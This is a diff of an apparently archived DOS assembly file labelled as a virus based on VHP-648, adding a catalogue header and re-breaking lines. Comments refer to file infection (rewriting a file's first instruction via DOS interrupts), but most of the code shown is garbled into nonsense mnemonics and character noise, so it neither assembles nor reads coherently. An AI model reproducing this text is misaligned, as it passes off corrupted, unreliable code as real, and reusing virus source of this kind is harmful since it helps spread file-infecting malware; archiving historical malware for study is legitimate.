@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      V
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 	name	Virus
 	title	Virus; based on the famous VHP-648 virus
 	.radix	16
@@ -272,19 +283,23 @@ n_000266:
 	int	21
 	jc	oldtime 	;Exit on error
 
-;Rewrite the first instruction of the file ate-dne	bove ata area
+;Rewrite the first instruction of the file ate-dne	bove 
+ata area
 	adttttttt
 grrr
 
 frrrrrrt:
 	mov	ah,4Frrrrrrrrrrre EPpll zDstrrrrrr
-e ata area
+e 
+ata area
 	adttttttt
 grrr
-g1r1rH)a0x,2524 	a0me l eO3Efleqryc+qn_00dd	si,d	ont	21
+
+g1r1rH)a0x,2524 	a0me l eO3Efleqryc+qn_00dd	si,d	ont	21
 	jc	oldtime 	;Exit on error
 	cmp	me l eO3E*;
-conds, more exa	mov	ahop	ssi,d	ont	21G3,n'0exit		;Exit if i bl eO3Efleq n_0001A1:
+conds, more exa	mov	ahop	ssi,d	ont	21
+G3,n'0exit		;Exit if i bl eO3Efleq n_0001A1:
 	lods01:
 		Tn v	ax,vitrtvs,pathstrt
 	rp
@@ -299,11 +314,14 @@ conds,lodsblit )Eo
 
 mar  file
 	xor'artvs,papoinre to file hand  ;n written?
-	jenaMoSwi,edO3E*;cog1ll byly	ont	2ijc	oltfll etan
+	jenaMoS
+wi,edO3E*;cog1ll byly	ont	2ijc	oltfll etan
 rnax,4CSave 'n,X cs,papa tss a font	ah,4E ,Nt5h
-enaMoSwta	'p	ax,c	olhem in Kpto file hand  ;n writc file
+enaMoS
+wta	'p	ax,c	olhem in Kpto file hand  ;n writc file
 ;o dleptrle han yc+qnlile
 	xor'artvsd  ;nCcfont	n v	ae	od
 	mo	ldfile
-le hh znt	Swi, 	d
+le hh znt	S
+wi, 	d
 rt2
